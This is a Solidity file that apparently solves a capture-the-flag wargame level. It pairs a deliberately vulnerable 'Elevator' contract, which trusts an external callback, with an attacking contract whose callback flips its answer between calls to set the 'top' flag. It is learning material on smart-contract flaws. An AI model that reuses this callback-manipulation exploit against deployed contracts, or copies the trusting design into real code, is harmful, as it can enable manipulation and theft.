// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract BuildingSolver is Building {
    bool public lastFloor = true;

    function isLastFloor(uint256) external override returns (bool) {
        lastFloor = !lastFloor;
        return lastFloor;
    }

    function attack(address elevatorAddress) public {
        Elevator elevator = Elevator(elevatorAddress);
        elevator.goTo(2);
    }
}
